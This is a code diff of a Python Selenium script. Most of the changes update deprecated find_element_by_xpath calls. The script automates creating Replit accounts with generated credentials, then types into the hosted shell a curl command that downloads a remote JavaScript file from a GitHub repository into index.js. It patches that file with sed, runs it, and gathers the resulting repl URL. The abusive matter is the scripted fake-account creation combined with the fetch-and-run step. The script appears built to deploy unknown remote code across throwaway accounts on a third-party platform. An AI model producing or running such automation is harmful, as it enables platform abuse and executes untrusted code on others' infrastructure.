@@ -7,6 +7,7 @@ import random
 import json
 import os
 import requests
+from selenium.webdriver.common.by import By
 options = uc.ChromeOptions()
 
 low_word = "abcdefghijklkmnopqrstuvwxyz"
@@ -50,20 +51,20 @@ driver.switch_to.window(driver.window_handles[0])
 time.sleep(1)
 driver.get('https://replit.com/signup?from=landing')
 time.sleep(3)
-driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[2]/div/input").send_keys(usernamerepl)
+driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[2]/div/input").send_keys(usernamerepl)
 time.sleep(1)
-driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[3]/div/input").send_keys(emailrepl)
+driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[3]/div/input").send_keys(emailrepl)
 time.sleep(1)
-driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[4]/div/input").send_keys(passwordrepl)
+driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[4]/div/input").send_keys(passwordrepl)
 time.sleep(1)
-driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[5]/button").click()
+driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[5]/button").click()
 time.sleep(1)
 timez = int(time.time())+300
 while a==True:
     try:
-        if(driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[5]/button/span").text=="Create account"):
+        if(driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[5]/button/span").text=="Create account"):
             time.sleep(1)
-            driver.find_element_by_xpath("/html/body/div/div/div[2]/main/div/form/div/div[5]/button").click()
+            driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[5]/button").click()
     except:
         pass
     if(timez<int(time.time())):
@@ -81,7 +82,7 @@ time.sleep(8)
 while az==True:
     time.sleep(1)
     try:
-        driver.find_element_by_xpath("/html/body/div[3]/div/div[1]/button").click()
+        driver.find_element(By.XPATH,"/html/body/div[3]/div/div[1]/button").click()
         time.sleep(1)
         az = False
     except:
@@ -89,18 +90,18 @@ while az==True:
 
 
 time.sleep(1)
-driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[10]/div/div[2]").click()
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[10]/div/div[2]").click()
 time.sleep(2)
-driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("curl https://raw.githubusercontent.com/awaprimPL/expert-guacamole/main/a.js -o index.js")
-driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
-driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("sed -i 's/UNDEFINED/"+xdr+"/' index.js")
-driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("curl https://raw.githubusercontent.com/awaprimPL/expert-guacamole/main/a.js -o index.js")
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("sed -i 's/UNDEFINED/"+xdr+"/' index.js")
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
 time.sleep(1)
-driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[2]/div/div/div").click()
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[2]/div/div/div").click()
 time.sleep(10)
 
-namerepl = driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[3]/span").text
-username = driver.find_element_by_xpath("/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[1]/span/a").text
+namerepl = driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[3]/span").text
+username = driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[1]/span/a").text
 namerepl = namerepl.replace(".", "")
 tosendyez = "https://"+namerepl+"."+username+".repl.co/"
 headers = {
